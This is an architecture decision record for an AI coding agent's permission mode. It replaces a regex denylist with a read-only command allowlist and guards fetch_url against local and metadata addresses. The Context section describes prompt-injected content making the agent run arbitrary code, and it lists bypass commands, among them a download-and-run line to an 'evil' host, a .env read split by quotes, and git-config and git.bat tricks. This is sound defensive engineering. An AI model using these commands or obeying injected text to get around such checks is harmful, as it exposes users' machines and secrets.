---
status: accepted
date: 2026-10-22
---

# 0009. Guardrails mode auto-runs only read-only commands

## Context

Guardrails is the default permission mode. It ran any shell command that no risky-command rule matched: the rules were a regex denylist (`rm -rf`, `curl | sh`, `sudo`, `.env` and the like). A review on 2026-10-22 showed that text the agent reads and treats as instructions (a page from `fetch_url`, a README, MCP tool output) could run arbitrary code with no approval, because a denylist has to name every bad command and the shell has endless ways to spell one:

- `python3 -c "..."`, `node -e ...`, any interpreter;
- `curl -o /tmp/x https://evil; sh /tmp/x` (no pipe for the `curl | sh` rule to see);
- `bash -c "$(curl ...)"`;
- `rm -r -f build` (the rule wanted `-rf` together);
- `cat .e''nv` (quotes split the word the secrets rule looks for).

`fetch_url` itself could reach any host, including loopback, the local network and the cloud metadata address (169.254.169.254), through up to 20 unchecked redirects.

## Options considered

1. **Grow the denylist.** Add patterns for each bypass. Cheap, but it loses to the next spelling, and every pattern is another regex over shell text the regex does not understand.
2. **Allowlist read-only commands.** Auto-run a command only when every simple command in it is a known read-only one, read by a small, strict shell lexer that refuses (asks) whenever it is unsure. More prompts for build and test commands, which users can allow with their own rules.
3. **Ask for every command** (Ask mode for everyone). Safe, but it makes the default mode tiresome enough that people switch to YOLO.

## Decision

**Option 2.** Philip chose the allowlist on 2026-10-22. Guardrails auto-runs a command only when every segment (split on `|`, `&&`, `||`, `;`, `&`, newlines) is on the read-only list with no argument that writes or executes, or is matched by a user `allow` rule. Command substitution, `$` and `%` expansion, output redirection to a file, input redirection, heredocs, subshells, escape characters and unterminated quotes always ask. Rules are also matched after quote removal. Existing `deny` rules still deny in every mode; Ask and YOLO are unchanged. The lexer reads the grammar of the shell that will run the command (`/bin/sh`, `cmd.exe`, bash or PowerShell), and the list is one union of names, so the recorded results are the same on every platform.

For the network: `fetch_url` stays auto-allowed in Guardrails for public addresses and asks, in every mode but YOLO, before reaching this computer or the local network. The check is the one `image:fetch` already used (now shared as `nekko_web::netguard`): every address a name resolves to must be public, checked inside the client's resolver, and every redirect hop is checked again. A local destination asks instead of being refused because people do fetch their own dev servers.

## Consequences

- Prompt-injected text can no longer run code in the default mode without the user seeing the command. The bypasses above are tests (`crates/nekko-tools/src/guardrails.rs`, `crates/nekko-web/tests/fetch_guard.rs`).
- Guardrails asks more: `npm test`, `cargo build` and every background process now ask unless the user adds an `allow` rule. The approval prompt still reads "Run command"; the Settings rule list and the `guardrails:classify` tester explain why.
- `fetch_url` no longer uses a system proxy (a proxy would resolve names itself and defeat the check). Users who can only reach the web through a proxy will see fetches fail; revisit with an explicit proxy setting if that is reported.
- **Not solved here:** a read-only command is only as safe as its configuration. `git` honours repository config (`core.fsmonitor`, `diff.external`, textconv), which an in-workspace file edit (auto-allowed in Guardrails) could set before a `git status`. On Windows, `cmd.exe` searches the current folder before PATH, so a workspace `git.bat` would run for `git`. Both need their own fix (for example running allowlisted commands with a hardened environment).
- If people move to YOLO to escape the prompts, the allowlist is too narrow; widen it with more read-only commands rather than relaxing the reader.
- Spec: [spec/context/context-guardrails-memory-the-differentiators.md](../../spec/context/context-guardrails-memory-the-differentiators.md).
